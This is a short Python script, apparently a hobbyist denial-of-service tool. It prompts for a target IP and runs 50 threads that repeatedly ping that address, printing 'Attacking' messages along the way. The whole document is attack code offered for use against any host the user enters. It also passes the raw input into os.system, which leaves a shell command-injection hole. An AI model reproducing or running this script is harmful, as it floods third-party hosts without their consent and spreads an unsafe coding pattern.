import os
import threading
from pystyle import Colors, Colorate

ip = input("IP: ")

def ping_ip(ip_address, thread_number):
    for _ in range(50):
        print(f"{Colors.light_red}Attacking using thread {thread_number}")
        os.system(f"ping /n 1 {ip_address} >nul")

threads = []

for i in range(50):
    thread = threading.Thread(target=ping_ip, args=(ip, i+1))
    threads.append(thread)

for i, thread in enumerate(threads):
    thread.start()
    print(f"{Colors.light_red}Started thread {i+1}")

for thread in threads:
    thread.join()

print(f"{Colors.light_red}Attack complete.")
